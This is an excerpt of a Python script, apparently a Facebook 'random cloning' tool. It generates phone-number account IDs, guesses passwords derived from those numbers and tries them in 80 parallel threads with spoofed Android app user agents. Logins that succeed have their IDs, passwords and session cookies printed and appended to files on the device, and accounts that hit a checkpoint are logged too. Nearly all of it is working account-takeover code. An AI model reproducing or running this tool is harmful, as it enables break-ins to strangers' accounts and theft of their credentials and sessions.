...
def PAPI002():
	...
	by = "Dalvik/1.6.0 (Linux; U; Android 6.0; 480 Build/854) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Robi;FBMF/Infinix_Note_8;FBBD/Infinix_Note_8;FBPN/com.facebook.katana;FBDV/Infinix_Note_8_6_0;FBSV/6.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	ff = "Dalvik/1.6.0 (Linux; U; Android 10.0; 480 Build/854) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=480,height=854};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Grameenphone;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	gp = "Dalvik/1.6.0 (Linux; U; Android 8.0; 1440 Build/2560) [FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/314;FBDM/{density=3.0,width=1440,height=2560};FBLC/it_IT;FBRV/314.1.0.45.119;FBCR/Banglalink;FBMF/Infinix_Note_8i;FBBD/Infinix_Note_8i;FBPN/com.facebook.katana;FBDV/Infinix_Note_8i_8_0;FBSV/8.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	hc = "Dalvik/1.6.0 (Linux; U; Android 10.0; 1242 Build/2208) [FBAN/FB4A;FBAV/107.0.0.0.50;FBBV/107;FBDM/{density=3.0,width=1242,height=2208};FBLC/it_IT;FBRV/107.0.0.0.50;FBCR/Robi;FBMF/Samsung_Galaxy_Note_20_Ultra;FBBD/Samsung_Galaxy_Note_20_Ultra;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_Note_20_Ultra_10_0;FBSV/10.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
	kk = "Dalvik/1.6.0 (Linux; U; Android 7.0; 640 Build/1136) [FBAN/FB4A;FBAV/108.0.0.17.68;FBBV/108;FBDM/{density=3.0,width=640,height=1136};FBLC/it_IT;FBRV/108.0.0.17.68;FBCR/Grameenphone;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_7_0;FBSV/7.0;FBOP/1;FBCA/x86:armeabi-v7a;]"	
...
def Nodi_PAPI():
    ...
    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");Al_PAPI();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
    if Tahrima in ["1","A","a"]:
        Nodi()
    if Tahrima in ["2","B","b"]:
        Contact()
    if Tahrima in ["0","E","e"]:
    	...
    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");Nodi_PAPI()
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Contact():
	...
	if Tymin in ['1']:
		os.system('xdg-open https://www.facebook.com/pinik.anak')
	if Tymin in ['2']:
	...
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/KgPAPI')
	if Tymin in ['9']:
		Nodi_PAPI()
	if Tymin in ['0']:
...
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=80) as PAPI_Asha:
        os.system('clear')
        print(cloninglogo)
        Contact_Linex()
        tl = str(len(user))
        ...
        Contact_Linex()
        for love in user:
            pwx = [love,love[2:],code+love[:3],love[:6],love[:7],love[:8],'@123456@']
            uid = code+love
            if 'M1' in nabil:
            	PAPI_Asha.submit(Asraful1,uid,pwx,tl)
            elif 'M2' in nabil:
            	PAPI_Asha.submit(Asraful2,uid,pwx,tl)
            elif 'M3' in nabil:
            	PAPI_Asha.submit(Asraful3,uid,pwx,tl)
            elif 'M4' in nabil:
            	PAPI_Asha.submit(Asraful4,uid,pwx,tl)
            elif 'M5' in nabil:
            	PAPI_Asha.submit(Asraful5,uid,pwx,tl)
            else:
            	PAPI_Asha.submit(Asraful1,uid,pwx,tl)
#•••••••••••••••••••••••••M-UPDATE M1••••••••••••••••••••••••••#
#••••••••••••••••••••SCRIPT MATHOID M1•••••••••••••••••••••#
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mPAPI-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/PAPI-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[PAPI-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/PAPI-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mPAPI-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/PAPI-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[PAPI-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/PAPI-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mPAPI-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/PAPI-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[PAPI-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/PAPI-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful4(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=Z3-_Zr30MLLPSG6RdZCM5V3-; sb=Z3-_Ztrj72UfrzGaox6wCnhg; m_pixel_ratio=2; wd=360x662; fr=0A5MwSevyF4cEk0Xb..Bmv39n..AAA.0.0.Bmv397.AWX6fnTLfpU',
    'dpr': '2',
    'referer': 'https://p.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mPAPI-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/PAPI-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[PAPI-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/PAPI-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mPAPI-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/PAPI-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
             #   print('  \033[1;90m[PAPI-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/PAPI-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
